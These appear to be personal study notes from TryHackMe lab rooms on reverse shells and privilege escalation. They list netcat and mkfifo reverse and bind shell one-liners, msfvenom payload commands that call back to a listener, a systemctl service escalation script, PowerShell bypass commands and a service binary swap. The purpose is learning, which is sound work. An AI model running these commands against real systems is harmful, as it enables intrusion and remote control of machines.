# R

* Remember for web/general/security
* .todo: metasploit dns
* .todo: web
* web general | terminology | URL may have to be moved
* explose hacking_process

<hr>

## Prev esc

https://tryhackme.com/room/linprivesc
=> hint/notes
=> network

* https://tryhackme.com/room/introtoshells
* If there are tools not installed on your target: https://github.com/andrew-d/static-binaries
* nc ip port -e /bin/bash (rev shell)
* nc -lvnp port -e /bin/bash (bind shell)
* this is not included in most versions of netcat
* `mkfifo /tmp/f; nc XXX < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f` (listener for our wxw shell)
* https://tryhackme.com/room/introtoshells (Windows)
* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#netcat-traditional
* `msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>`
* staged reverse shell payloads and stageless
* exploit/multi/handler
  * It's essential if you want to use Meterpreter shells, and is the go-to when using staged payloads
  * `set PAYLOAD X`
  * `exploit -j`
* socat is a sort of ncat+more, but not installed by default, and harder to learn.
  * Read again the section: https://tryhackme.com/room/introtoshells
  * Can encrypt, may bypass an IDS: https://tryhackme.com/room/introtoshells
* Socat: transfer the socat binary
* Reverse shells/... note lasty

<hr>

## Overconfidence

--- https://tryhackme.com/room/rrootme

* `msfvenom -p php/reverse_php LHOST=tun0 LPORT=4455 -o revshell.php`
* exploit/multi/handler
* `msfvenom -p php/meterpreter/reverse_tcp LHOST=tun0 LPORT=4455 -o revshell2.php`
* `msfvenom -p php/meterpreter_reverse_tcp LHOST=tun0 LPORT=4455 -o revshell3.php5`
* `sudo bash -c "id"`
* https://www.revshells.com/
* TL;DR. Nothing explained to improve the shell worked. Could not run python commands, the shell was crashing. Had to use a web shell to run python commands. The meterpreter didn't work "as expected". The reverse tcp worked but it wasn't a good experience.
* writeups

--- https://tryhackme.com/room/vulnversity

* Capture a request uploading a file
* Intruder to test which filetype is not blocked
* `msfvenom -p php/reverse_php LHOST=tun0 LPORT=4444 -o mrevshell.phtml`
  * No one can make it work!!!
* `msfvenom -p php/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -o mrevshell_php_rtcp.phtml`

```bash
TF=$(mktemp).service
echo "[Service]
Type=oneshot
ExecStart=/bin/sh -c '$@ > /tmp/output'
[Install]
WantedBy=multi-user.target" > $TF
systemctl -f link $TF
systemctl -f enable --now $TF
cat /tmp/output
```

* `git clone https://github.com/brightio/penelope.git`
* `python penelope.py`

--- https://tryhackme.com/room/basicpentestingjt
--- https://tryhackme.com/room/kenobi

* `smbclient //10.10.12.68/Anonymous -U Anonymous/`
* From what I understood, on port 111, there is rcpbind that can indicate which port is providing a service given a protocol number
* `sudo nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.12.68`
* There was a failure in ProFtpd  that allowed users to move files from a non-mounted path to the mounted path. Could steal id_rsa.

--- https://tryhackme.com/room/steelmountain

* use meterpreter upload to upload the winPEAS
* `upload /tmp/xxx`
* `shell`
* `.\winPEASany_ofs.exe`
* `powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"`
* `powershell -ep bypass -c ". .\PowerUp.ps1;"`
* `https://github.com/itm4n/PrivescCheck#metasploit-timeout`
* `load powershell`
* `powershell_shell`
* `. .\PowerUp.ps1; Invoke-AllChecks`
* `. .\PowerUp.ps1` `PS > Invoke-AllChecks`
* https://www.joesandbox.com/#windows
* https://github.com/EgeBalci/sgn
* sc stop XXX
* `Write-ServiceBinary -Name 'XXX' -Path ".\nc.exe"`
* sc start XXX